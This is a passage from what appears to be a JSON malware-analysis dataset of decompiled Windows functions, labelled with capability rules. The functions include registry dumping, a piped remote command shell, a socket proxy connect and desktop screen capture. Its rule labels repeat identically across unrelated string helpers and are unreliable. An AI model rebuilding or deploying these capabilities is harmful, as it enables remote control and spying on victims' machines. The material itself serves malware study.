puVar1 = &stack0x0000002c + iVar6;\n        *(&stack0x00000018 + iVar6) = 0;\n        piVar9 = &stack0xffffffdc + iVar6;\n        while( true ) {\n            piVar2 = piVar9 + 0x1c;\n            piVar9[7] = 0;\n            piVar9[6] = 0;\n            piVar9[4] = 0;\n            piVar9[5] = piVar9 + 0x16;\n            piVar9[3] = puVar1;\n            piVar9[2] = piVar2;\n            piVar9[1] = piVar9[0xf];\n            *piVar9 = piVar9[0x13];\n            piVar9[-1] = 0x410b84;\n            iVar6 = sub.ADVAPI32.DLL_RegEnumValueA();\n            if (iVar6 == 0x103) break;\n            piVar9[7] = piVar9[7] + 1;\n            piVar10 = piVar9 + -8;\n    // switch table (12 cases) at 0x4243e4\n            switch(piVar9[0xe]) {\n            case 0:\n            case 3:\n                piVar9[-3] = puVar1;\n                piVar9[-4] = 0;\n                piVar9[-5] = 0;\n                piVar9[-6] = 0;\n                piVar9[-7] = piVar2;\n                piVar9[-8] = piVar9[0xb];\n                piVar9[-9] = 0x410da9;\n                iVar6 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                piVar10 = piVar9 + -0xe;\n                if (iVar6 == 0) {\n                    piVar9[-0xe] = piVar9[6];\n                    piVar9[-0xf] = 0x410dc0;\n                    iVar6 = sub.msvcrt.dll_malloc();\n                    piVar9[9] = iVar6;\n                    piVar10 = piVar9 + -0xe;\n                    if (iVar6 != 0) {\n                        piVar9[-10] = iVar6;\n                        piVar9[-9] = puVar1;\n                        piVar9[-0xb] = puVar1;\n                        piVar9[-0xc] = 0;\n                        piVar9[-0xd] = piVar2;\n                        piVar9[-0xe] = piVar9[5];\n                        piVar9[-0xf] = 0x410df0;\n                        iVar6 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                        piVar10 = piVar9 + -0x14;\n                        if (iVar6 == 0) {\n                            bVar11 = false;\n                            piVar9[4] = 0x4243e0;\n                            piVar9[5] = 0;\n                            if (*piVar9 != 0) {\n                                piVar9[-0x13] = *piVar9;\n                                piVar9[-0x14] = piVar9[3];\n                                piVar9[-0x15] = 0x410e25;\n                                iVar6 = fcn.00412f60();\n                                bVar11 = iVar6 != 0;\n                                piVar9[4] = iVar6;\n                            }\n                            piVar9[-0x12] = piVar2;\n                            piVar9[-0x13] = \"%s\\a%d\\a%s\\a\";\n                            piVar9[-0x14] = piVar9 + 5;\n                            piVar9[-0x10] = piVar9[4];\n                            piVar9[-0x11] = piVar9[2];\n                            piVar9[-0x15] = 0x410e58;\n                            iVar6 = fcn.00412755();\n                            if ((iVar6 != 0) && (piVar9[5] != 0)) {\n                                piVar9[-0x12] = iVar6;\n                                piVar9[-0x13] = piVar9[5];\n                                piVar9[-0x14] = uVar4;\n                                piVar9[-0x15] = 0x410e74;\n                                fcn.00412458();\n                                piVar9[-0x14] = piVar9 + 5;\n                                piVar9[-0x15] = 0x410e7c;\n                                fcn.00407f59();\n                            }\n                            if (bVar11) {\n                                piVar9[-0x14] = piVar9 + 4;\n                                piVar9[-0x15] = 0x410e8e;\n                                fcn.00407f59();\n                            }\n                        }\n                        piVar9[-0x14] = piVar9 + 3;\n                        piVar9[-0x15] = 0x410e9a;\n                        fcn.00407f59();\n                    }\n                }\n                break;\n            case 1:\n            case 2:\n            case 7:\n                piVar3 = piVar9 + 0x24;\n                piVar9[-6] = 0x1000;\n                piVar9[-7] = 0;\n                piVar9[0xc] = 0x1000;\n                piVar9[-8] = piVar3;\n                piVar9[-9] = 0x410bd3;\n                fcn.004129e4();\n                piVar9[-3] = puVar1;\n                piVar9[-4] = piVar3;\n                piVar9[-5] = 0;\n                piVar9[-6] = 0;\n                piVar9[-7] = piVar2;\n                piVar9[-8] = piVar9[0xb];\n                piVar9[-9] = 0x410bfb;\n                iVar6 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                piVar10 = piVar9 + -0xe;\n                if (iVar6 == 0) {\n                    iVar6 = piVar9[8];\n                    if ((iVar6 == 7) && (iVar5 = piVar9[6],  iVar5 != 0)) {\n                        for (uVar7 = 0; uVar7 < iVar5 - 1U; uVar7 = uVar7 + 1) {\n                            if (*(piVar9 + uVar7 + 0x78) == '\\0') {\n                                *(piVar9 + uVar7 + 0x78) = 8;\n                            }\n                        }\n                    }\n                    piVar9[-0xb] = piVar2;\n                    piVar9[-9] = piVar3;\n                    piVar9[-10] = iVar6;\n                    piVar9[-0xc] = \"%s\\a%d\\a%s\\a\";\n                    piVar9[-0xd] = 0x1000;\n                    piVar9[-0xe] = piVar9 + 0x41e;\n                    piVar9[-0xf] = 0x410c3a;\n                    iVar6 = fcn.004127a8();\ncode_r0x00410d60:\n                    piVar10 = piVar9 + -0xe;\n                    if (iVar6 != 0) {\n                        piVar9[-0xc] = iVar6;\n                        piVar9[-0xd] = piVar9 + 0x41e;\n                        piVar9[-0xe] = uVar4;\n                        piVar9[-0xf] = 0x410d78;\n                        fcn.00412458();\n                        piVar10 = piVar9 + -0xe;\n                    }\n                }\n                break;\n            case 4:\n                piVar9[-3] = puVar1;\n                piVar9[-5] = 0;\n                piVar9[-6] = 0;\n                piVar9[-7] = piVar2;\n                piVar9[-4] = piVar9 + 0xd;\n                piVar9[0xc] = 4;\n                piVar9[-8] = piVar9[0xb];\n                piVar9[-9] = 0x410c97;\n                iVar6 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                piVar10 = piVar9 + -0xe;\n                if (iVar6 == 0) {\n                    piVar9[-0xb] = piVar2;\n                    piVar9[-0xc] = \"%s\\a%d\\a0x%.8X (%d)\\a\";\n                    piVar9[-0xd] = 0x1000;\n                    piVar9[-0xe] = piVar9 + 0x41e;\n                    piVar9[-8] = piVar9[7];\n                    piVar9[-9] = piVar9[7];\n                    piVar9[-10] = piVar9[8];\n                    piVar9[-0xf] = 0x410cd9;\n                    iVar6 = fcn.004127a8();\n                    goto code_r0x00410d60;\n                }\n                break;\n            case 0xb:\n                piVar9[-3] = puVar1;\n                piVar9[-5] = 0;\n                piVar9[-6] = 0;\n                piVar9[-7] = piVar2;\n                piVar9[-4] = piVar9 + 0x12;\n                piVar9[0xc] = 8;\n                piVar9[-8] = piVar9[0xb];\n                piVar9[-9] = 0x410d12;\n                iVar6 = sub.ADVAPI32.DLL_RegQueryValueExA();\n                piVar10 = piVar9 + -0xe;\n                if (iVar6 == 0) {\n                    piVar9[-0xb] = piVar2;\n                    piVar9[-0xc] = \"%s\\a%d\\a0x%.16llX (%I64d)\\a\";\n                    piVar9[-0xd] = 0x1000;\n                    piVar9[-7] = piVar9[0xc];\n                    piVar9[-9] = piVar9[0xc];\n                    piVar9[-6] = piVar9[0xd];\n                    piVar9[-8] = piVar9[0xd];\n                    piVar9[-0xe] = piVar9 + 0x41e;\n                    piVar9[-10] = piVar9[8];\n                    piVar9[-0xf] = 0x410d60;\n                    iVar6 = fcn.004127a8();\n                    goto code_r0x00410d60;\n                }\n            }\n            *(piVar10 + 0x50) = 0x1000;\n            piVar9 = piVar10;\n        }\n        piVar9[-8] = piVar9[0xb];\n        piVar9[-9] = 0x410eb3;\n        uVar7 = sub.ADVAPI32.DLL_RegCloseKey();\n        piVar9[-9] = uVar7;\n        uVar8 = 1;\n    }\n    return uVar7 & 0xffffff00 | uVar8;\n}\n",
        "token_count": 2828
    },
    "004113b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004113b8(uint *param_1)\n\n{\n    bool bVar1;\n    bool bVar2;\n    char cVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uchar *puStack748;\n    uint uStack744;\n    uint uStack740;\n    uchar *puStack736;\n    char *pcStack732;\n    uchar *puStack728;\n    uchar *puStack724;\n    uint uStack720;\n    uint uStack692;\n    uint uStack688;\n    uchar *puStack672;\n    uchar auStack668 [8];\n    uchar auStack660 [4];\n    uchar auStack656 [16];\n    uchar auStack640 [4];\n    uint uStack636;\n    uint uStack632;\n    uchar auStack628 [16];\n    uchar auStack612 [8];\n    uint uStack604;\n    ushort uStack600;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uchar auStack544 [528];\n    \n    pcStack732 = \"ComSpec\";\n    puStack736 = 0x4113dc;\n    uStack720 = sub.msvcrt.dll_getenv();\n    puStack724 = 0x42446c;\n    puStack728 = 0x204;\n    puStack736 = 0x4113f8;\n    pcStack732 = &stack0xfffffde0;\n    fcn.004127a8();\n    puStack736 = 0x411400;\n    pcStack732 = &stack0xfffffde0;\n    cVar3 = fcn.00406f1a();\n    if (cVar3 == '\\0') {\n        pcStack732 = 0x42446f;\n        puStack736 = 0x411410;\n        uVar4 = sub.msvcrt.dll_getenv();\n        pcStack732 = \"%6\\\\6Z65dlNh\\\\YlS.dfd\";\n        puStack736 = 0x41141e;\n        puStack724 = fcn.004081aa();\n        puStack728 = 0x204;\n        puStack736 = 0x411436;\n        pcStack732 = &stack0xfffffde0;\n        uStack720 = uVar4;\n        fcn.004127a8();\n    }\n    puStack736 = 0x41143e;\n    pcStack732 = &stack0xfffffde0;\n    cVar3 = fcn.00406f1a();\n    if (cVar3 != '\\0') {\n        puStack724 = 0x44;\n        puStack728 = NULL;\n        uStack636 = 0;\n        uStack632 = 1;\n        puStack736 = 0x411476;\n        pcStack732 = &stack0xfffffd9c;\n        fcn.004129e4();\n        puStack724 = 0x10;\n        puStack728 = NULL;\n        puStack736 = 0x41148e;\n        pcStack732 = &stack0xfffffd8c;\n        fcn.004129e4();\n        puStack728 = &stack0xfffffd70;\n        puStack724 = &stack0xfffffd80;\n        uStack720 = 0;\n        pcStack732 = &stack0xfffffd6c;\n        puStack736 = 0x4114b6;\n        puStack672 = puStack724;\n        iVar5 = sub.KERNEL32.dll_CreatePipe();\n        puStack736 = NULL;\n        if (iVar5 != 0) {\n            puStack748 = &stack0xfffffd64;\n            uStack740 = uStack688;\n            uStack744 = 0x42b5d4;\n            iVar5 = sub.KERNEL32.dll_CreatePipe();\n            if (iVar5 != 0) {\n                sub.KERNEL32.dll_GetStartupInfoA(&stack0xfffffd9c);\n                uStack584 = uStack692;\n                uStack588 = uStack692;\n                uStack740 = 0;\n                uStack744 = 0;\n                puStack748 = NULL;\n                iVar6 = 0;\n                uVar4 = 0;\n                uStack592 = uStack688;\n                uStack604 = 0x101;\n                uStack600 = 0;\n                puStack736 = &stack0xfffffd9c;\n                pcStack732 = &stack0xfffffd8c;\n                iVar5 = sub.KERNEL32.dll_CreateProcessA(0, &stack0xfffffde0, 0, 0);\n                if (iVar5 != 0) {\n                    sub.KERNEL32.dll_CloseHandle(pcStack732);\n                    bVar1 = false;\n                    sub.KERNEL32.dll_CloseHandle(pcStack732);\n                    pcStack732 = NULL;\n                    fcn.00405d7d(*param_1, 0xb6, &stack0xfffffde0, 0xffffffff);\ncode_r0x004115e7:\n                    puStack728 = NULL;\n                    iVar5 = sub.KERNEL32.dll_PeekNamedPipe(uStack744, 0, 0, 0, &stack0xfffffd28, 0);\n                    if (iVar5 == 0) goto code_r0x004116a1;\n                    if ((*0x42b5d0 != 0) &&\n                       (((bVar2 = bVar1,  bVar1 || (iVar6 = sub.msvcrt.dll_malloc(1),  bVar2 = true,  iVar6 != 0)) &&\n                        (bVar1 = bVar2,  iVar5 = sub.KERNEL32.dll_ReadFile(uVar4, iVar6, 1, &stack0xfffffd28, 0), \n                        iVar5 != 0)))) goto code_r0x00411678;\n                    goto code_r0x004116ab;\n                }\n            }\n        }\n    }\n    fcn.00405d7d(*param_1, 0xb9, 0);\n    return;\ncode_r0x00411678:\n    iVar5 = fcn.00405d7d();\n    if (iVar5 == -1) {\ncode_r0x004116a1:\n        *0x42b5d0 = 0;\ncode_r0x004116ab:\n        if (*0x42b5d0 == 0) {\n            sub.KERNEL32.dll_CloseHandle(uStack744);\n            sub.KERNEL32.dll_CloseHandle(*0x42b5d4);\n            sub.KERNEL32.dll_TerminateProcess(uStack720, 0);\n            fcn.00405d7d(*param_1, 0xb8, 0, 0);\n            if (puStack748 == NULL) {\n                return;\n            }\n            fcn.00407f59(&stack0xfffffd14);\n            return;\n        }\n        fcn.00407ef4(0x96);\n    }\n    goto code_r0x004115e7;\n}\n",
        "token_count": 1494
    },
    "00411a5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411a5c(int32_t *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint uStack780;\n    int32_t iStack776;\n    uchar *puStack772;\n    int32_t iStack768;\n    uint uStack764;\n    int32_t iStack760;\n    uchar *puStack756;\n    int32_t iStack752;\n    uchar *puStack748;\n    uint32_t uStack744;\n    uint uStack736;\n    uint uStack732;\n    uchar *puStack728;\n    uint uStack724;\n    uint uStack720;\n    uchar *puStack716;\n    uint uStack692;\n    uint uStack688;\n    uint uStack680;\n    uint uStack676;\n    uchar auStack586 [14];\n    uchar uStack572;\n    uchar auStack571 [299];\n    uint uStack272;\n    int32_t iStack268;\n    \n    puStack716 = &stack0xfffffd58;\n    puStack748 = &stack0xfffffef0;\n    uStack692 = 0xffffffff;\n    uStack688 = 0xffffffff;\n    uStack680 = 5;\n    uStack676 = 0;\n    iStack268 = *param_1;\n    uStack720 = 0;\n    uStack724 = 0;\n    uStack272 = 1;\n    uStack732 = iStack268 + 1;\n    uStack736 = 0x411acc;\n    puStack728 = puStack748;\n    iVar2 = sub.WS2_32.dll_select();\n    if (iVar2 < 1) {\n        return;\n    }\n    iStack752 = *param_1;\n    puStack756 = 0x411ae5;\n    iVar2 = sub.WS2_32.dll___WSAFDIsSet();\n    if (iVar2 == 0) {\n        return;\n    }\n    puStack756 = &stack0xfffffd34;\n    puStack748 = NULL;\n    iStack752 = 4;\n    iStack760 = *param_1;\n    uStack764 = 0x411b11;\n    iVar2 = sub.WS2_32.dll_recv();\n    if (iVar2 < 1) {\n        return;\n    }\n    iStack776 = *param_1;\n    uStack764 = 0;\n    puStack772 = &stack0xfffffdc4;\n    if (uStack732 == 1) {\n        iStack768 = 6;\n        uStack780 = 0x411b48;\n        iVar2 = sub.WS2_32.dll_recv();\n        if (iVar2 != 6) {\n            return;\n        }\n        uStack732 = CONCAT22(uStack732._2_2_, 2);\n        fcn.00412aa3(&stack0xfffffd26, &stack0xfffffdc4, 2);\n        fcn.00412aa3(&stack0xfffffd28, &stack0xfffffdb6, 4);\n        fcn.004129e4(&stack0xfffffd2c, 0, 8);\n    }\n    else {\n        iStack768 = 0x100;\n        uStack780 = 0x411bc7;\n        iVar2 = sub.WS2_32.dll_recv();\n        if (iVar2 < 1) {\n            return;\n        }\n        uStack744 = 0;\n        iVar2 = fcn.00412548(&stack0xfffffd34, &stack0xfffffdc4, 0x80);\n        fcn.00412aa3(&stack0xfffffd18, &stack0xfffffdc5 + iVar2, 2);\n        uVar3 = sub.WS2_32.dll_ntohs(uStack744 & 0xffff);\n        puStack748 = uVar3 & 0xffff;\n        cVar1 = fcn.004051b5(&stack0xfffffd34, puStack748, &stack0xfffffd20);\n        if (cVar1 == '\\0') {\n            uVar4 = 1;\n            goto code_r0x00411c75;\n        }\n    }\n    uVar4 = 1;\n    iStack768 = sub.WS2_32.dll_socket(2, 1, 6);\n    if (iStack768 != -1) {\n        iVar2 = sub.WS2_32.dll_connect();\n        if (iVar2 != -1) {\n            fcn.00411a22(*param_1, 3);\n            fcn.00411770(uStack780, *param_1);\n            return;\n        }\n        fcn.00411a22(*param_1, 2);\n        fcn.00405999(&stack0xfffffcf4);\n        return;\n    }\ncode_r0x00411c75:\n    fcn.00411a22(*param_1, uVar4);\n    return;\n}\n",
        "token_count": 1078
    },
    "00411d8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00411d8c(uint *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t in_stack_ffffff10;\n    uchar *in_stack_ffffff14;\n    int32_t in_stack_ffffff1c;\n    int32_t iStack220;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint uStack204;\n    uchar auStack200 [4];\n    uint uStack196;\n    int32_t *piStack192;\n    uint uStack188;\n    uint32_t uStack184;\n    int32_t iStack180;\n    int32_t iStack176;\n    int32_t iStack172;\n    int32_t iStack168;\n    int32_t iVar7;\n    int32_t iStack152;\n    uint uStack144;\n    int32_t *piStack140;\n    uint32_t uStack132;\n    uint *puStack124;\n    uint uStack120;\n    int32_t iStack108;\n    int32_t *piStack96;\n    uint uStack92;\n    \n    uStack92 = 0;\n    piStack96 = param_2;\n    *param_1 = 0;\n    iVar1 = sub.USER32.dll_GetSystemMetrics();\n    iVar2 = sub.USER32.dll_GetSystemMetrics();\n    iStack168 = 0x411dd9;\n    iStack108 = sub.USER32.dll_GetDesktopWindow();\n    if ((iStack108 != 0 && iVar1 != 0) && (iVar2 != 0)) {\n        iStack168 = 0x411e02;\n        iVar3 = sub.USER32.dll_GetDC();\n        iStack172 = 0x411e0d;\n        iStack168 = iVar3;\n        uStack120 = sub.GDI32.dll_CreateCompatibleDC();\n        iStack176 = 0x411e22;\n        iStack172 = iVar3;\n        iStack168 = iVar1;\n        iVar4 = sub.GDI32.dll_CreateCompatibleBitmap();\n        if ((iVar3 != 0 && uStack132 != 0) && (iVar4 != 0)) {\n            uStack184 = uStack132;\n            uStack188 = 0x411e54;\n            iStack180 = iVar4;\n            sub.GDI32.dll_SelectObject();\n            iVar7 = 0;\n            iStack168 = 0;\n            uStack184 = 0;\n            uStack188 = 0;\n            piStack192 = piStack140;\n            uStack196 = 0x411e96;\n            iStack180 = iVar1;\n            iStack176 = iVar2;\n            iStack172 = iVar3;\n            iVar5 = sub.GDI32.dll_BitBlt();\n            if (iVar5 != 0) {\n                iStack220 = 0xe;\n                fcn.004129e4(&stack0xffffff62, 0);\n                iStack220 = 0x2c;\n                fcn.004129e4(&stack0xffffff70, 0);\n                puStack208 = &stack0xffffff70;\n                uStack204 = 0;\n                uStack212 = 0;\n                uStack216 = 0;\n                iStack220 = 0;\n                uStack144 = 0x28;\n                uStack132 = uStack132;\n                in_stack_ffffff1c = iVar3;\n                iVar5 = sub.GDI32.dll_GetDIBits(iVar3, iVar4);\n                if (iVar5 != 0) {\n                    uStack188 = CONCAT22(0x4d42, uStack188);\n                    iStack180 = 0;\n                    iStack176 = 0x36;\n                    iStack172 = 0x28;\n                    uStack184 = ((iStack168 + 1) * 3 & 0xfffffffcU) * iVar7 + 0x36;\n                    *piStack96 = iStack152 + 0x36;\n                    iStack168 = iVar1;\n                    piStack192 = sub.msvcrt.dll_calloc(iStack152 + 0x36, 4);\n                    if (piStack192 != NULL) {\n                        in_stack_ffffff14 = &stack0xffffff54;\n                        in_stack_ffffff10 = piStack192 + 0x36;\n                        iVar5 = sub.GDI32.dll_GetDIBits(iVar3, iVar4, 0, iVar2, in_stack_ffffff10, in_stack_ffffff14, 0)\n                        ;\n                        if (iVar5 == 0) {\n                            fcn.00407f59(&stack0xffffff24);\n                            *puStack124 = 0;\n                        }\n                        else {\n                            fcn.00412aa3(iStack220, &stack0xffffff2a, 0xe);\n                            fcn.00412aa3(iStack220 + 0xe, &stack0xffffff38, 0x28);\n                        }\n                    }\n                }\n            }\n        }\n        uVar6 = sub.USER32.dll_ReleaseDC(in_stack_ffffff1c, iVar3);\n        sub.GDI32.dll_DeleteDC(in_stack_ffffff10, uVar6);\n        sub.GDI32.dll_DeleteObject(iVar4);\n        if ((in_stack_ffffff14 != NULL) && (0 < *piStack140)) {\n            uVar6 = fcn.004049cf(in_stack_ffffff14, piStack140, iVar1, iVar2, in_stack_ffffff10 & 0xff, 1);\n            sub.msvcrt.dll_free(in_stack_ffffff14);\n            return uVar6;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1248
    },
    "004120c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004120c4(uint param_1, uchar param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t aiStack16 [2];\n    \n    aiStack16[0] = 0;\n    iVar1 = fcn.00411d8c(aiStack16, param_2);\n    if ((iVar1 == 0) || (aiStack16[0] < 1)) {\n        fcn.00405d7d(param_1, 0xcb, 0, 0);\n    }\n    else {\n        iVar2 = sub.msvcrt.dll_malloc(0x230);\n        if (iVar2 != 0) {\n            *(iVar2 + 0x208) = 0;\n            *(iVar2 + 0x20c) = 0xc9;\n            *(iVar2 + 0x20d) = 0xca;\n            *(iVar2 + 0x20e) = 0xcb;\n            *(iVar2 + 0x204) = iVar1;\n            *(iVar2 + 0x218) = aiStack16[0];\n            *(iVar2 + 0x220) = 0;\n            *(iVar2 + 0x21c) = aiStack16[0] >> 0x1f;\n            *(iVar2 + 0x224) = 0;\n            *(iVar2 + 0x210) = param_1;\n            fcn.00407f08(0x413eb3, iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "00412548": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.00412548(char *param_1, char *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    \n    pcVar2 = param_2;\n    if (param_3 == 0) {\ncode_r0x00412574:\n        do {\n            pcVar3 = pcVar2 + 1;\n            cVar1 = *pcVar2;\n            pcVar2 = pcVar3;\n        } while (cVar1 != '\\0');\n    }\n    else {\n        pcVar4 = param_1;\n        do {\n            if (pcVar4 == param_1 + param_3 + -1) {\n                *pcVar4 = '\\0';\n                goto code_r0x00412574;\n            }\n            pcVar3 = pcVar2 + 1;\n            cVar1 = *pcVar2;\n            *pcVar4 = cVar1;\n            pcVar2 = pcVar3;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n    }\n    return pcVar3 + (-1 - param_2);\n}\n",
        "token_count": 267
    },
    "00412588": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.00412588(char *param_1, char *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    \n    for (pcVar4 = param_1; (pcVar4 != param_1 + param_3 && (*pcVar4 != '\\0')); pcVar4 = pcVar4 + 1) {\n    }\n    iVar5 = pcVar4 - param_1;\n    param_3 = param_3 - iVar5;\n    pcVar2 = param_2;\n    if (param_3 == 0) {\n        uVar3 = 0xffffffff;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *param_2;\n            param_2 = param_2 + 1;\n        } while (cVar1 != '\\0');\n        pcVar2 = iVar5 + -1 + ~uVar3;\n    }\n    else {\n        for (; *pcVar2 != '\\0'; pcVar2 = pcVar2 + 1) {\n            if (param_3 != 1) {\n                *pcVar4 = *pcVar2;\n                param_3 = param_3 + -1;\n                pcVar4 = pcVar4 + 1;\n            }\n        }\n        *pcVar4 = '\\0';\n        pcVar2 = pcVar2 + (iVar5 - param_2);\n    }\n    return pcVar2;\n}\n",
        "token_count": 353
    },
    "00412630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00412630(char *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    \n    do {\n        pcVar1 = param_2;\n        pcVar2 = param_1;\n        if (*param_1 == '\\0') {\n            return 0xffffffff;\n        }\n        while (*pcVar2 == *pcVar1) {\n            pcVar1 = pcVar1 + 1;\n            if ((pcVar2[1] == '\\0') || (pcVar2 = pcVar2 + 1,  *pcVar1 == '\\0')) break;\n        }\n        if (*pcVar1 == '\\0') {\n            return 1;\n        }\n        param_1 = param_1 + 1;\n    } while( true );\n}\n",
        "token_count": 177
    },
    "004128b5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.004128b5(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    char cVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    bool bVar5;\n    char *pcVar6;\n    char *pcVar7;\n    \n    uVar4 = in_EAX & 0xffffff00;\n    bVar5 = param_1 == NULL || param_2 == NULL;\n    if (param_1 == NULL || param_2 == NULL) {\n        bVar5 = false;\n    }\n    else {\n        bVar2 = false;\n        pcVar7 = param_2;\n        pcVar6 = param_1;\n        while( true ) {\n            cVar3 = *pcVar7;\n            uVar4 = cVar3;\n            if (cVar3 == '\\0') break;\n            cVar1 = *param_1;\n            if (cVar1 == '*') {\n                do {\n                    param_1 = param_1 + 1;\n                    uVar4 = uVar4 & 0xffffff00;\n                } while (*param_1 == '*');\n                if (*param_1 == '\\0') {\n                    bVar5 = true;\n                    goto code_r0x0041295e;\n                }\ncode_r0x00412904:\n                bVar2 = true;\n                param_2 = pcVar7;\n                pcVar6 = param_1;\n            }\n            else {\n                if (cVar1 == '?') {\n                    if (cVar3 == '.') goto code_r0x0041294b;\n                }\n                else {\n                    cVar3 = fcn.0041284f(uVar4);\n                    uVar4 = fcn.0041284f(cVar1);\n                    if (cVar3 != uVar4) {\ncode_r0x0041294b:\n                        if (bVar2) {\n                            pcVar7 = param_2 + 1;\n                            param_1 = pcVar6;\n                            goto code_r0x00412904;\n                        }\n                        goto code_r0x0041295e;\n                    }\n                }\n                param_1 = param_1 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n        }\n        while( true ) {\n            uVar4 = uVar4 & 0xffffff00;\n            if (*param_1 != '*') break;\n            param_1 = param_1 + 1;\n        }\n        bVar5 = *param_1 == '\\0';\n    }\ncode_r0x0041295e:\n    return uVar4 & 0xffffff00 | bVar5;\n}\n",
        "token_count": 583
    },
    "00412abf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.00412abf(char **param_1, int32_t param_2, char **param_3, int32_t param_4, char param_5)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    pcVar2 = *param_1;\n    if ((param_2 == -1) && (pcVar2 != NULL)) {\n        uVar3 = 0xffffffff;\n        pcVar4 = pcVar2;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        param_2 = ~uVar3 - 1;\n    }\n    pcVar4 = *param_3;\n    if ((param_4 == -1) && (pcVar4 != NULL)) {\n        uVar3 = 0xffffffff;\n        pcVar5 = pcVar4;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        param_4 = ~uVar3 - 1;\n    }\n    iVar6 = param_4 + param_2;\n    if (-1 < iVar6) {\n        if (param_2 < 1) {\n            if ((pcVar2 != NULL) && (param_5 != '\\0')) {\n                fcn.00407f59(param_1);\n            }\n            return *param_3;\n        }\n        if (param_4 < 1) {\n            if ((param_5 != '\\0') && (pcVar4 != NULL)) {\n                fcn.00407f59(param_3);\n            }\n            return *param_1;\n        }\n        pcVar2 = sub.msvcrt.dll_realloc(pcVar2, iVar6 + 